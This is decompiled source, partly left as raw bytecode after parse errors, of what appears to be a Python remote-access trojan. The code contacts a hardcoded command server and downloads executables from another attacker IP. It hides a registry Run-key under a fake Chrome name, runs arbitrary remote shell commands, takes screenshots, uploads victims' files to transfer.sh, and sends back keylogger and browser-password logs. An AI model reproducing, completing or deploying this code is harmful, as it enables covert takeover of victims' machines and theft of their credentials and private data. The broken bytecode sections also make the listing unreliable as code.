# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.6.15 (default, Sep 28 2021, 20:18:52) 
# [GCC 10.2.1 20210110]
# Embedded file name: stub.pyw
import socket
from subprocess import Popen, PIPE
from time import sleep
import signal, struct
from tempfile import gettempdir
from sys import executable
from sys import exit as exits
from os import chdir, startfile, getcwd, path, remove, mkdir
from tempfile import gettempdir
from wget import download as dw
from platform import node, machine, version, release, architecture, processor, system
from PIL import ImageGrab
from requests import post
from Modules.pasd import gogo

class Cli(object):

    def __init__(self):
        self.apexRH = '92.240.245.231'
        self.apexRP = 3369
        self.socket = None
        self.plg_pathz = gettempdir() + '\\m_plugins'

    def auto_dw(self):
        try:
            chdir(self.plg_pathz)
            if path.exists('ngk.exe'):
                pass
            else:
                dw('http://85.204.116.160/ngk/ngk.exe')
                dw('http://85.204.116.160/ngk/svchost.exe')
        except Exception as e:
            try:
                print(str(e))
            finally:
                e = None
                del e

    def downloadz(self, url):
        try:
            folme = gettempdir()
            chdir(self.plg_pathz)
            folderx = dw(url)
            startfile(folderx)
        except Exception as e:
            try:
                self.send_infoz(str(e))
            finally:
                e = None
                del e

    def run_dp(self):
        try:
            chdir(self.plg_pathz)
            startfile('svchost.exe')
            self.send_infoz('Remote Server is running!')
        except Exception as e:
            try:
                self.send_infoz(str(e) + '\nTry installing the remote desktop plugin!')
            finally:
                e = None
                del e

    def read_port(self):
        chdir(self.plg_pathz)
        try:
            f = open('x.txt', 'r')
            fv = f.read()
            f.close()
            self.send_infoz(str(fv))
        except:
            self.send_infoz('ERROR')

    def open_ngrok(self):
        try:
            chdir(self.plg_pathz)
            Popen('ngk.exe', shell=True)
            self.send_infoz('Server is starting wait at least 10 seconds...')
        except Exception as e:
            try:
                self.send_infoz(str(e))
            finally:
                e = None
                del e

    def plugin_down(self, fuxur):
        try:
            chdir(gettempdir())
            if path.exists('m_plugins') == True:
                chdir('m_plugins')
                dw(fuxur)
            else:
                mkdir('m_plugins')
                chdir('m_plugins')
                dw(fuxur)
        except:
            pass

    def kizi(self):
        _path = executable
        cmdxx = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v GoogeChromeAutoLaunch /f /d ""{}""'.format(_path)
        Popen(cmdxx, shell=True, stdin=PIPE, stdout=PIPE,
          stderr=PIPE)

    def register_me(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)

    def quit_gracefully(self, signal=None, frame=None):
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                try:
                    str(e)
                finally:
                    e = None
                    del e

        exits(0)

    def socket_create--- This code section failed: ---

 L. 127         0  SETUP_FINALLY        16  'to 16'

 L. 128         2  LOAD_GLOBAL              socket
                4  LOAD_METHOD              socket
                6  CALL_METHOD_0         0  ''
                8  LOAD_FAST                'self'
               10  STORE_ATTR               socket
               12  POP_BLOCK        
               14  JUMP_FORWARD         58  'to 58'
             16_0  COME_FROM_FINALLY     0  '0'

 L. 129        16  DUP_TOP          
               18  LOAD_GLOBAL              socket
               20  LOAD_ATTR                error
               22  COMPARE_OP               exception-match
               24  POP_JUMP_IF_FALSE    56  'to 56'
               26  POP_TOP          
               28  STORE_FAST               'e'
               30  POP_TOP          
               32  SETUP_FINALLY        44  'to 44'

 L. 130        34  POP_BLOCK        
               36  POP_EXCEPT       
               38  CALL_FINALLY         44  'to 44'
               40  LOAD_CONST               None
               42  RETURN_VALUE     
             44_0  COME_FROM            38  '38'
             44_1  COME_FROM_FINALLY    32  '32'
               44  LOAD_CONST               None
               46  STORE_FAST               'e'
               48  DELETE_FAST              'e'
               50  END_FINALLY      
               52  POP_EXCEPT       
               54  JUMP_FORWARD         58  'to 58'
             56_0  COME_FROM            24  '24'
               56  END_FINALLY      
             58_0  COME_FROM            54  '54'
             58_1  COME_FROM            14  '14'

Parse error at or near `CALL_FINALLY' instruction at offset 38

    def net_connect(self):
        try:
            self.socket.connect((self.apexRH, self.apexRP))
        except socket.error as e:
            try:
                sleep(5)
                raise
            finally:
                e = None
                del e

        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            try:
                raise
            finally:
                e = None
                del e

    def send_infoz(self, data_b):
        sent_msg = str.encode(data_b)
        self.socket.send(struct.pack('>I', len(sent_msg)) + sent_msg)

    def browps(self):
        try:
            chdir(gettempdir())
            try:
                mkdir('m_plugins')
            except:
                pass
            else:
                chdir(self.plg_pathz)
                gogo()
                gologs = open('logs.txt', 'r')
                gol = gologs.read()
                gologs.close()
                self.send_infoz(gol)
        except Exception as e:
            try:
                self.send_infoz(str(e))
            finally:
                e = None
                del e

    def sysinfo(self):
        try:
            syz = '\nUsername: ' + node()
            syz += '\nOS: ' + system() + '  ' + release()
            syz += '\nOS Version: ' + version()
            syz += '\nArchitecture: ' + str(architecture())
            syz += '\nProcessor: ' + processor()
            syz += '\nMachine: ' + machine()
            self.send_infoz(syz)
        except Exception as e:
            try:
                eve = str(e)
                self.send_infoz(e)
            finally:
                e = None
                del e

    def read_keyz(self):
        try:
            chdir(gettempdir())
            pcz = open('pczlog.txt', 'r')
            limbo = pcz.read()
            pcz.close()
            self.send_infoz(str(limbo))
        except:
            self.send_infoz('[-] No logs found or plugin is not running \\ installed!')

    def get_filez(self, filexx):
        try:
            filex = {'upload_file': open(filexx, 'rb')}
            r = post('https://transfer.sh', files=filex)
            outlinz = 'LINK: ' + str(r.text)
            self.send_infoz(outlinz)
        except Exception as e:
            try:
                self.send_infoz(str(e))
            finally:
                e = None
                del e

    def get_sec(self):
        try:
            scr = ImageGrab.grab().save('screenshotet.png')
            scfile = {'upload_file': open('screenshotet.png', 'rb')}
            tr = post('https://transfer.sh', files=scfile)
            filink = 'LINK OF SCREENSHOT: ' + str(tr.text)
            self.send_infoz(filink)
        except Exception as e:
            try:
                self.send_infoz(str(e))
            finally:
                e = None
                del e

    def receive_sms--- This code section failed: ---

 L. 224         0  SETUP_FINALLY        18  'to 18'

 L. 225         2  LOAD_FAST                'self'
                4  LOAD_ATTR                socket
                6  LOAD_METHOD              recv
                8  LOAD_CONST               10
               10  CALL_METHOD_1         1  ''
               12  POP_TOP          
               14  POP_BLOCK        
               16  JUMP_FORWARD         58  'to 58'
             18_0  COME_FROM_FINALLY     0  '0'

 L. 226        18  DUP_TOP          
               20  LOAD_GLOBAL              Exception
               22  COMPARE_OP               exception-match
               24  POP_JUMP_IF_FALSE    56  'to 56'
               26  POP_TOP          
               28  STORE_FAST               'e'
               30  POP_TOP          
               32  SETUP_FINALLY        44  'to 44'

 L. 227        34  POP_BLOCK        
               36  POP_EXCEPT       
               38  CALL_FINALLY         44  'to 44'
               40  LOAD_CONST               None
               42  RETURN_VALUE     
             44_0  COME_FROM            38  '38'
             44_1  COME_FROM_FINALLY    32  '32'
               44  LOAD_CONST               None
               46  STORE_FAST               'e'
               48  DELETE_FAST              'e'
               50  END_FINALLY      
               52  POP_EXCEPT       
               54  JUMP_FORWARD         58  'to 58'
             56_0  COME_FROM            24  '24'
               56  END_FINALLY      
             58_0  COME_FROM            54  '54'
             58_1  COME_FROM            16  '16'

 L. 228        58  LOAD_GLOBAL              str
               60  LOAD_METHOD              encode
               62  LOAD_GLOBAL              str
               64  LOAD_GLOBAL              getcwd
               66  CALL_FUNCTION_0       0  ''
               68  CALL_FUNCTION_1       1  ''
               70  LOAD_STR                 '> '
               72  BINARY_ADD       
               74  CALL_METHOD_1         1  ''
               76  STORE_FAST               'cwd'

 L. 229        78  LOAD_FAST                'self'
               80  LOAD_ATTR                socket
               82  LOAD_METHOD              send
               84  LOAD_GLOBAL              struct
               86  LOAD_METHOD              pack
               88  LOAD_STR                 '>I'
               90  LOAD_GLOBAL              len
               92  LOAD_FAST                'cwd'
               94  CALL_FUNCTION_1       1  ''
               96  CALL_METHOD_2         2  ''
               98  LOAD_FAST                'cwd'
              100  BINARY_ADD       
              102  CALL_METHOD_1         1  ''
              104  POP_TOP          
            106_0  COME_FROM           952  '952'

 L. 231       106  LOAD_CONST               None
              108  STORE_FAST               'output_str'

 L. 232       110  LOAD_FAST                'self'
              112  LOAD_ATTR                socket
              114  LOAD_METHOD              recv
              116  LOAD_CONST               204800
              118  CALL_METHOD_1         1  ''
              120  STORE_FAST               'data'

 L. 233       122  LOAD_FAST                'data'
              124  LOAD_CONST               b''
              126  COMPARE_OP               ==
              128  POP_JUMP_IF_FALSE   138  'to 138'

 L. 233   130_132  BREAK_LOOP         1026  'to 1026'
          134_136  JUMP_FORWARD        946  'to 946'
            138_0  COME_FROM           128  '128'

 L. 234       138  LOAD_FAST                'data'
              140  LOAD_CONST               None
              142  LOAD_CONST               2
              144  BUILD_SLICE_2         2 
              146  BINARY_SUBSCR    
              148  LOAD_METHOD              decode
              150  LOAD_STR                 'utf-8'
              152  CALL_METHOD_1         1  ''
              154  LOAD_STR                 'cd'
              156  COMPARE_OP               ==
              158  POP_JUMP_IF_FALSE   250  'to 250'

 L. 235       160  LOAD_FAST                'data'
              162  LOAD_CONST               3
              164  LOAD_CONST               None
              166  BUILD_SLICE_2         2 
              168  BINARY_SUBSCR    
              170  LOAD_METHOD              decode
              172  LOAD_STR                 'utf-8'
              174  CALL_METHOD_1         1  ''
              176  STORE_FAST               'directory'

 L. 236       178  SETUP_FINALLY       196  'to 196'

 L. 237       180  LOAD_GLOBAL              chdir
              182  LOAD_FAST                'directory'
              184  LOAD_METHOD              strip
              186  CALL_METHOD_0         0  ''
              188  CALL_FUNCTION_1       1  ''
              190  POP_TOP          
              192  POP_BLOCK        
              194  JUMP_FORWARD        242  'to 242'
            196_0  COME_FROM_FINALLY   178  '178'

 L. 238       196  DUP_TOP          
              198  LOAD_GLOBAL              Exception
              200  COMPARE_OP               exception-match
              202  POP_JUMP_IF_FALSE   240  'to 240'
              204  POP_TOP          
              206  STORE_FAST               'e'
              208  POP_TOP          
              210  SETUP_FINALLY       228  'to 228'

 L. 239       212  LOAD_STR                 'Could not change directory: '
              214  LOAD_GLOBAL              str
              216  LOAD_FAST                'e'
              218  CALL_FUNCTION_1       1  ''
              220  BINARY_ADD       
              222  STORE_FAST               'output_str'
              224  POP_BLOCK        
              226  BEGIN_FINALLY    
            228_0  COME_FROM_FINALLY   210  '210'
              228  LOAD_CONST               None
              230  STORE_FAST               'e'
              232  DELETE_FAST              'e'
              234  END_FINALLY      
              236  POP_EXCEPT       
              238  JUMP_FORWARD        946  'to 946'
            240_0  COME_FROM           202  '202'
              240  END_FINALLY      
            242_0  COME_FROM           194  '194'

 L. 241       242  LOAD_STR                 ''
              244  STORE_FAST               'output_str'
          246_248  JUMP_FORWARD        946  'to 946'
            250_0  COME_FROM           158  '158'

 L. 242       250  LOAD_FAST                'data'
              252  LOAD_CONST               None
              254  LOAD_CONST               None
              256  BUILD_SLICE_2         2 
              258  BINARY_SUBSCR    
              260  LOAD_METHOD              decode
              262  LOAD_STR                 'utf-8'
              264  CALL_METHOD_1         1  ''
              266  LOAD_STR                 'terminate'
              268  COMPARE_OP               ==
          270_272  POP_JUMP_IF_FALSE   298  'to 298'

 L. 243       274  LOAD_FAST                'self'
              276  LOAD_ATTR                socket
              278  LOAD_METHOD              close
              280  CALL_METHOD_0         0  ''
              282  POP_TOP          

 L. 244       284  LOAD_GLOBAL              exits
              286  CALL_FUNCTION_0       0  ''
              288  POP_TOP          

 L. 245   290_292  BREAK_LOOP         1026  'to 1026'
          294_296  JUMP_FORWARD        946  'to 946'
            298_0  COME_FROM           270  '270'

 L. 246       298  LOAD_FAST                'data'
              300  LOAD_CONST               None
              302  LOAD_CONST               3
              304  BUILD_SLICE_2         2 
              306  BINARY_SUBSCR    
              308  LOAD_METHOD              decode
              310  LOAD_STR                 'utf-8'
              312  CALL_METHOD_1         1  ''
              314  LOAD_STR                 'get'
              316  COMPARE_OP               ==
          318_320  POP_JUMP_IF_FALSE   354  'to 354'

 L. 247       322  LOAD_FAST                'data'
              324  LOAD_CONST               4
              326  LOAD_CONST               None
              328  BUILD_SLICE_2         2 
              330  BINARY_SUBSCR    
              332  LOAD_METHOD              decode
              334  LOAD_STR                 'utf-8'
              336  CALL_METHOD_1         1  ''
              338  STORE_FAST               'fileto'

 L. 248       340  LOAD_FAST                'self'
              342  LOAD_METHOD              get_filez
              344  LOAD_FAST                'fileto'
              346  CALL_METHOD_1         1  ''
              348  POP_TOP          
          350_352  JUMP_FORWARD        946  'to 946'
            354_0  COME_FROM           318  '318'

 L. 249       354  LOAD_FAST                'data'
              356  LOAD_CONST               None
              358  LOAD_CONST               None
              360  BUILD_SLICE_2         2 
              362  BINARY_SUBSCR    
              364  LOAD_METHOD              decode
              366  LOAD_STR                 'utf-8'
              368  CALL_METHOD_1         1  ''
              370  LOAD_STR                 'key_dump'
              372  COMPARE_OP               ==
          374_376  POP_JUMP_IF_FALSE   390  'to 390'

 L. 250       378  LOAD_FAST                'self'
              380  LOAD_METHOD              read_keyz
              382  CALL_METHOD_0         0  ''
              384  POP_TOP          
          386_388  JUMP_FORWARD        946  'to 946'
            390_0  COME_FROM           374  '374'

 L. 252       390  LOAD_FAST                'data'
              392  LOAD_CONST               None
              394  LOAD_CONST               None
              396  BUILD_SLICE_2         2 
              398  BINARY_SUBSCR    
              400  LOAD_METHOD              decode
              402  LOAD_STR                 'utf-8'
              404  CALL_METHOD_1         1  ''
              406  LOAD_STR                 'read_port'
              408  COMPARE_OP               ==
          410_412  POP_JUMP_IF_FALSE   426  'to 426'

 L. 253       414  LOAD_FAST                'self'
              416  LOAD_METHOD              read_port
              418  CALL_METHOD_0         0  ''
              420  POP_TOP          
          422_424  JUMP_FORWARD        946  'to 946'
            426_0  COME_FROM           410  '410'

 L. 254       426  LOAD_FAST                'data'
              428  LOAD_CONST               None
              430  LOAD_CONST               None
              432  BUILD_SLICE_2         2 
              434  BINARY_SUBSCR    
              436  LOAD_METHOD              decode
              438  LOAD_STR                 'utf-8'
              440  CALL_METHOD_1         1  ''
              442  LOAD_STR                 'screenshot'
              444  COMPARE_OP               ==
          446_448  POP_JUMP_IF_FALSE   462  'to 462'

 L. 255       450  LOAD_FAST                'self'
              452  LOAD_METHOD              get_sec
              454  CALL_METHOD_0         0  ''
              456  POP_TOP          
          458_460  JUMP_FORWARD        946  'to 946'
            462_0  COME_FROM           446  '446'

 L. 256       462  LOAD_FAST                'data'
              464  LOAD_CONST               None
              466  LOAD_CONST               None
              468  BUILD_SLICE_2         2 
              470  BINARY_SUBSCR    
              472  LOAD_METHOD              decode
              474  LOAD_STR                 'utf-8'
              476  CALL_METHOD_1         1  ''
              478  LOAD_STR                 'remote_dp'
              480  COMPARE_OP               ==
          482_484  POP_JUMP_IF_FALSE   498  'to 498'

 L. 257       486  LOAD_FAST                'self'
              488  LOAD_METHOD              run_dp
              490  CALL_METHOD_0         0  ''
              492  POP_TOP          
          494_496  JUMP_FORWARD        946  'to 946'
            498_0  COME_FROM           482  '482'

 L. 258       498  LOAD_FAST                'data'
              500  LOAD_CONST               None
              502  LOAD_CONST               None
              504  BUILD_SLICE_2         2 
              506  BINARY_SUBSCR    
              508  LOAD_METHOD              decode
              510  LOAD_STR                 'utf-8'
              512  CALL_METHOD_1         1  ''
              514  LOAD_STR                 'brow'
              516  COMPARE_OP               ==
          518_520  POP_JUMP_IF_FALSE   534  'to 534'

 L. 259       522  LOAD_FAST                'self'
              524  LOAD_METHOD              browps
              526  CALL_METHOD_0         0  ''
              528  POP_TOP          
          530_532  JUMP_FORWARD        946  'to 946'
            534_0  COME_FROM           518  '518'

 L. 260       534  LOAD_FAST                'data'
              536  LOAD_CONST               None
              538  LOAD_CONST               None
              540  BUILD_SLICE_2         2 
              542  BINARY_SUBSCR    
              544  LOAD_METHOD              decode
              546  LOAD_STR                 'utf-8'
              548  CALL_METHOD_1         1  ''
              550  LOAD_STR                 'open_server'
              552  COMPARE_OP               ==
          554_556  POP_JUMP_IF_FALSE   570  'to 570'

 L. 261       558  LOAD_FAST                'self'
              560  LOAD_METHOD              open_ngrok
              562  CALL_METHOD_0         0  ''
              564  POP_TOP          
          566_568  JUMP_FORWARD        946  'to 946'
            570_0  COME_FROM           554  '554'

 L. 262       570  LOAD_FAST                'data'
              572  LOAD_CONST               None
              574  LOAD_CONST               4
              576  BUILD_SLICE_2         2 
              578  BINARY_SUBSCR    
              580  LOAD_METHOD              decode
              582  LOAD_STR                 'utf-8'
              584  CALL_METHOD_1         1  ''
              586  LOAD_STR                 'wget'
              588  COMPARE_OP               ==
          590_592  POP_JUMP_IF_FALSE   686  'to 686'

 L. 263       594  LOAD_FAST                'data'
              596  LOAD_CONST               5
              598  LOAD_CONST               None
              600  BUILD_SLICE_2         2 
              602  BINARY_SUBSCR    
              604  LOAD_METHOD              decode
              606  LOAD_STR                 'utf-8'
              608  CALL_METHOD_1         1  ''
              610  STORE_FAST               'furl'

 L. 264       612  SETUP_FINALLY       628  'to 628'

 L. 265       614  LOAD_FAST                'self'
              616  LOAD_METHOD              downloadz
              618  LOAD_FAST                'furl'
              620  CALL_METHOD_1         1  ''
              622  POP_TOP          

 L. 266       624  POP_BLOCK        
              626  JUMP_FORWARD        946  'to 946'
            628_0  COME_FROM_FINALLY   612  '612'

 L. 267       628  DUP_TOP          
              630  LOAD_GLOBAL              Exception
              632  COMPARE_OP               exception-match
          634_636  POP_JUMP_IF_FALSE   680  'to 680'
              638  POP_TOP          
              640  STORE_FAST               'e'
              642  POP_TOP          
              644  SETUP_FINALLY       668  'to 668'

 L. 268       646  LOAD_STR                 'ERROR: '
              648  LOAD_FAST                'e'
              650  BINARY_ADD       
              652  STORE_FAST               'texto'

 L. 269       654  LOAD_FAST                'self'
              656  LOAD_METHOD              send_infoz
              658  LOAD_FAST                'texto'
              660  CALL_METHOD_1         1  ''
              662  POP_TOP          
              664  POP_BLOCK        
              666  BEGIN_FINALLY    
            668_0  COME_FROM_FINALLY   644  '644'
              668  LOAD_CONST               None
              670  STORE_FAST               'e'
              672  DELETE_FAST              'e'
              674  END_FINALLY      
              676  POP_EXCEPT       
              678  JUMP_FORWARD        946  'to 946'
            680_0  COME_FROM           634  '634'
              680  END_FINALLY      
          682_684  JUMP_FORWARD        946  'to 946'
            686_0  COME_FROM           590  '590'

 L. 270       686  LOAD_FAST                'data'
              688  LOAD_CONST               None
              690  LOAD_CONST               6
              692  BUILD_SLICE_2         2 
              694  BINARY_SUBSCR    
              696  LOAD_METHOD              decode
              698  LOAD_STR                 'utf-8'
              700  CALL_METHOD_1         1  ''
              702  LOAD_STR                 'plugin'
              704  COMPARE_OP               ==
          706_708  POP_JUMP_IF_FALSE   758  'to 758'

 L. 271       710  LOAD_FAST                'data'
              712  LOAD_CONST               7
              714  LOAD_CONST               None
              716  BUILD_SLICE_2         2 
              718  BINARY_SUBSCR    
              720  LOAD_METHOD              decode
              722  LOAD_STR                 'utf-8'
              724  CALL_METHOD_1         1  ''
              726  STORE_FAST               'fux'

 L. 272       728  SETUP_FINALLY       744  'to 744'

 L. 273       730  LOAD_FAST                'self'
              732  LOAD_METHOD              plugin_down
              734  LOAD_FAST                'fux'
              736  CALL_METHOD_1         1  ''
              738  POP_TOP          
              740  POP_BLOCK        
              742  JUMP_FORWARD        756  'to 756'
            744_0  COME_FROM_FINALLY   728  '728'

 L. 274       744  POP_TOP          
              746  POP_TOP          
              748  POP_TOP          

 L. 275       750  POP_EXCEPT       
              752  JUMP_FORWARD        756  'to 756'
              754  END_FINALLY      
            756_0  COME_FROM           752  '752'
            756_1  COME_FROM           742  '742'
              756  JUMP_FORWARD        946  'to 946'
            758_0  COME_FROM           706  '706'

 L. 276       758  LOAD_FAST                'data'
              760  LOAD_CONST               None
              762  LOAD_CONST               None
              764  BUILD_SLICE_2         2 
              766  BINARY_SUBSCR    
              768  LOAD_METHOD              decode
              770  LOAD_STR                 'utf-8'
              772  CALL_METHOD_1         1  ''
              774  LOAD_STR                 'sysinfo'
              776  COMPARE_OP               ==
          778_780  POP_JUMP_IF_FALSE   792  'to 792'

 L. 277       782  LOAD_FAST                'self'
              784  LOAD_METHOD              sysinfo
              786  CALL_METHOD_0         0  ''
              788  POP_TOP          
              790  JUMP_FORWARD        946  'to 946'
            792_0  COME_FROM           778  '778'

 L. 278       792  LOAD_GLOBAL              len
              794  LOAD_FAST                'data'
              796  CALL_FUNCTION_1       1  ''
              798  LOAD_CONST               0
              800  COMPARE_OP               >
          802_804  POP_JUMP_IF_FALSE   946  'to 946'

 L. 279       806  SETUP_FINALLY       878  'to 878'

 L. 280       808  LOAD_GLOBAL              Popen
              810  LOAD_FAST                'data'
              812  LOAD_CONST               None
              814  LOAD_CONST               None
              816  BUILD_SLICE_2         2 
              818  BINARY_SUBSCR    
              820  LOAD_METHOD              decode
              822  LOAD_STR                 'utf-8'
              824  CALL_METHOD_1         1  ''
              826  LOAD_CONST               True
              828  LOAD_GLOBAL              PIPE

 L. 281       830  LOAD_GLOBAL              PIPE

 L. 281       832  LOAD_GLOBAL              PIPE

 L. 280       834  LOAD_CONST               ('shell', 'stdout', 'stderr', 'stdin')
              836  CALL_FUNCTION_KW_5     5  '5 total positional and keyword args'
              838  STORE_FAST               'cmd'

 L. 282       840  LOAD_FAST                'cmd'
              842  LOAD_ATTR                stdout
              844  LOAD_METHOD              read
              846  CALL_METHOD_0         0  ''
              848  LOAD_FAST                'cmd'
              850  LOAD_ATTR                stderr
              852  LOAD_METHOD              read
              854  CALL_METHOD_0         0  ''
              856  BINARY_ADD       
              858  STORE_FAST               'output_bytes'

 L. 283       860  LOAD_FAST                'output_bytes'
              862  LOAD_ATTR                decode
              864  LOAD_STR                 'utf-8'
              866  LOAD_STR                 'replace'
              868  LOAD_CONST               ('errors',)
              870  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              872  STORE_FAST               'output_str'
              874  POP_BLOCK        
              876  JUMP_FORWARD        946  'to 946'
            878_0  COME_FROM_FINALLY   806  '806'

 L. 284       878  DUP_TOP          
              880  LOAD_GLOBAL              Exception
              882  COMPARE_OP               exception-match
          884_886  POP_JUMP_IF_FALSE   944  'to 944'
            888_0  COME_FROM           626  '626'
              888  POP_TOP          
              890  STORE_FAST               'e'
              892  POP_TOP          
              894  SETUP_FINALLY       932  'to 932'

 L. 285       896  LOAD_STR                 'Command execution unsuccessful: '
              898  LOAD_GLOBAL              str
              900  LOAD_FAST                'e'
              902  CALL_FUNCTION_1       1  ''
              904  BINARY_ADD       
              906  STORE_FAST               'output_str'

 L. 286       908  LOAD_GLOBAL              getcwd
              910  CALL_FUNCTION_0       0  ''
              912  STORE_FAST               'cdw'

 L. 288       914  LOAD_FAST                'self'
              916  LOAD_METHOD              send_infoz
              918  LOAD_FAST                'output_str'
              920  LOAD_FAST                'cdw'
              922  BINARY_ADD       
              924  CALL_METHOD_1         1  ''
              926  POP_TOP          
              928  POP_BLOCK        
              930  BEGIN_FINALLY    
            932_0  COME_FROM_FINALLY   894  '894'
              932  LOAD_CONST               None
              934  STORE_FAST               'e'
            936_0  COME_FROM           238  '238'
              936  DELETE_FAST              'e'
              938  END_FINALLY      
            940_0  COME_FROM           678  '678'
              940  POP_EXCEPT       
              942  JUMP_FORWARD        946  'to 946'
            944_0  COME_FROM           884  '884'
              944  END_FINALLY      
            946_0  COME_FROM           942  '942'
            946_1  COME_FROM           876  '876'
            946_2  COME_FROM           802  '802'
            946_3  COME_FROM           790  '790'
            946_4  COME_FROM           756  '756'
            946_5  COME_FROM           682  '682'
            946_6  COME_FROM           566  '566'
            946_7  COME_FROM           530  '530'
            946_8  COME_FROM           494  '494'
            946_9  COME_FROM           458  '458'
           946_10  COME_FROM           422  '422'
           946_11  COME_FROM           386  '386'
           946_12  COME_FROM           350  '350'
           946_13  COME_FROM           294  '294'
           946_14  COME_FROM           246  '246'
           946_15  COME_FROM           134  '134'

 L. 289       946  LOAD_FAST                'output_str'
              948  LOAD_CONST               None
              950  COMPARE_OP               is-not
              952  POP_JUMP_IF_FALSE   106  'to 106'

 L. 290       954  SETUP_FINALLY       980  'to 980'

 L. 291       956  LOAD_GLOBAL              getcwd
              958  CALL_FUNCTION_0       0  ''
              960  STORE_FAST               'cdw'

 L. 293       962  LOAD_FAST                'self'
              964  LOAD_METHOD              send_infoz
              966  LOAD_FAST                'output_str'
              968  LOAD_FAST                'cdw'
              970  BINARY_ADD       
              972  CALL_METHOD_1         1  ''
              974  POP_TOP          
              976  POP_BLOCK        
              978  JUMP_BACK           106  'to 106'
            980_0  COME_FROM_FINALLY   954  '954'

 L. 294       980  DUP_TOP          
              982  LOAD_GLOBAL              Exception
              984  COMPARE_OP               exception-match
          986_988  POP_JUMP_IF_FALSE  1022  'to 1022'
              990  POP_TOP          
              992  STORE_FAST               'e'
              994  POP_TOP          
              996  SETUP_FINALLY      1010  'to 1010'

 L. 295       998  LOAD_GLOBAL              str
             1000  LOAD_FAST                'e'
             1002  CALL_FUNCTION_1       1  ''
             1004  POP_TOP          
             1006  POP_BLOCK        
             1008  BEGIN_FINALLY    
           1010_0  COME_FROM_FINALLY   996  '996'
             1010  LOAD_CONST               None
             1012  STORE_FAST               'e'
             1014  DELETE_FAST              'e'
             1016  END_FINALLY      
             1018  POP_EXCEPT       
             1020  JUMP_BACK           106  'to 106'
           1022_0  COME_FROM           986  '986'
             1022  END_FINALLY      
             1024  JUMP_BACK           106  'to 106'

 L. 296      1026  LOAD_FAST                'self'
             1028  LOAD_ATTR                socket
             1030  LOAD_METHOD              close
             1032  CALL_METHOD_0         0  ''
             1034  POP_TOP          

Parse error at or near `CALL_FINALLY' instruction at offset 38


def pexor--- This code section failed: ---

 L. 302         0  LOAD_GLOBAL              Cli
                2  CALL_FUNCTION_0       0  ''
                4  STORE_FAST               'cozmo'

 L. 303         6  LOAD_FAST                'cozmo'
                8  LOAD_METHOD              kizi
               10  CALL_METHOD_0         0  ''
               12  POP_TOP          

 L. 304        14  LOAD_FAST                'cozmo'
               16  LOAD_METHOD              register_me
               18  CALL_METHOD_0         0  ''
               20  POP_TOP          

 L. 305        22  LOAD_FAST                'cozmo'
               24  LOAD_METHOD              socket_create
               26  CALL_METHOD_0         0  ''
               28  POP_TOP          

 L. 307        30  SETUP_FINALLY        52  'to 52'

 L. 308        32  LOAD_FAST                'cozmo'
               34  LOAD_METHOD              auto_dw
               36  CALL_METHOD_0         0  ''
               38  POP_TOP          

 L. 309        40  LOAD_FAST                'cozmo'
               42  LOAD_METHOD              net_connect
               44  CALL_METHOD_0         0  ''
               46  POP_TOP          
               48  POP_BLOCK        
               50  BREAK_LOOP           98  'to 98'
             52_0  COME_FROM_FINALLY    30  '30'

 L. 310        52  DUP_TOP          
               54  LOAD_GLOBAL              Exception
               56  COMPARE_OP               exception-match
               58  POP_JUMP_IF_FALSE    92  'to 92'
               60  POP_TOP          
               62  STORE_FAST               'e'
               64  POP_TOP          
               66  SETUP_FINALLY        80  'to 80'

 L. 311        68  LOAD_GLOBAL              sleep
               70  LOAD_CONST               5
               72  CALL_FUNCTION_1       1  ''
               74  POP_TOP          
               76  POP_BLOCK        
               78  BEGIN_FINALLY    
             80_0  COME_FROM_FINALLY    66  '66'
               80  LOAD_CONST               None
               82  STORE_FAST               'e'
               84  DELETE_FAST              'e'
               86  END_FINALLY      
               88  POP_EXCEPT       
               90  JUMP_BACK            30  'to 30'
             92_0  COME_FROM            58  '58'
               92  END_FINALLY      

 L. 313        94  BREAK_LOOP           98  'to 98'
               96  JUMP_BACK            30  'to 30'

 L. 314        98  SETUP_FINALLY       112  'to 112'

 L. 315       100  LOAD_FAST                'cozmo'
              102  LOAD_METHOD              receive_sms
              104  CALL_METHOD_0         0  ''
              106  POP_TOP          
              108  POP_BLOCK        
              110  JUMP_FORWARD        154  'to 154'
            112_0  COME_FROM_FINALLY    98  '98'

 L. 316       112  DUP_TOP          
              114  LOAD_GLOBAL              Exception
              116  COMPARE_OP               exception-match
              118  POP_JUMP_IF_FALSE   152  'to 152'
              120  POP_TOP          
              122  STORE_FAST               'e'
              124  POP_TOP          
              126  SETUP_FINALLY       140  'to 140'

 L. 317       128  LOAD_GLOBAL              str
              130  LOAD_FAST                'e'
              132  CALL_FUNCTION_1       1  ''
              134  POP_TOP          
              136  POP_BLOCK        
              138  BEGIN_FINALLY    
            140_0  COME_FROM_FINALLY   126  '126'
              140  LOAD_CONST               None
              142  STORE_FAST               'e'
              144  DELETE_FAST              'e'
              146  END_FINALLY      
              148  POP_EXCEPT       
              150  JUMP_FORWARD        154  'to 154'
            152_0  COME_FROM           118  '118'
              152  END_FINALLY      
            154_0  COME_FROM           150  '150'
            154_1  COME_FROM           110  '110'

 L. 318       154  LOAD_FAST                'cozmo'
              156  LOAD_ATTR                socket
              158  LOAD_METHOD              close
              160  CALL_METHOD_0         0  ''
              162  POP_TOP          

Parse error at or near `JUMP_BACK' instruction at offset 90


if __name__ == '__main__':
    while True:
        pexor()